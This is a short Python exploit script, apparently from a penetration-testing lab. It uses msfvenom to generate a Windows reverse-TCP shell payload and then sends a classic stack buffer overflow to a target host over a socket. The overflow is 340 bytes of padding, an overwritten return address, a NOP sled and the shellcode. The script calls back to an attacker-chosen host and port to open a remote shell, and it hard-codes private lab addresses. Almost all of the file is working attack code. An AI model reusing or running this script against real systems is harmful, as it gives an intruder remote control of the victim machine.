import os

def genPayload(LHOST, LPORT):
    ### Payload Generation ##############################################
    #LHOST="192.168.1.92"
    #LPORT="8888"
    badchars = "\\x00"
    command = "msfvenom -p windows/shell_reverse_tcp LHOST="+LHOST+" LPORT="+str(LPORT)+" EXITFUNC=thread  -b '"+badchars+"' -f py -o msfpayload.py"
    os.system(command)
    import msfpayload
    payload = msfpayload.buf #payload = first_stage + str(buf, 'ascii', errors='ignore')
    return payload
    #######################################################################

def exploit(payload, RHOST, RPORT):
    prefix = ""
    offset = 340
    overflow = "A" * offset
    retn = "\x41\x10\x15\x03"[::-1]
    padding = "\x90"*10 #+ "\xcc"
    postfix = ""

    buffer = prefix + overflow + retn + padding + payload + postfix
    data = buffer

    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST,RPORT))
    s.send(""+ buffer)
    
### bad Characters ##############
pp = ""
for x in range(1, 256):
  if x not in [0x0]:
      #print("\\x" + "{:02x}".format(x), end='')
      pp += ("\\x" + "{:02x}".format(x))
      
#print(pp)
payload = eval('"'+pp+'"')
#print(payload)
with open("/tmp/binary.bin", "w") as f: f.write(payload)
##################################### 
 
payload = genPayload('192.168.49.168', 7138)
exploit(payload, '192.168.168.129', 7138)
print("Done")
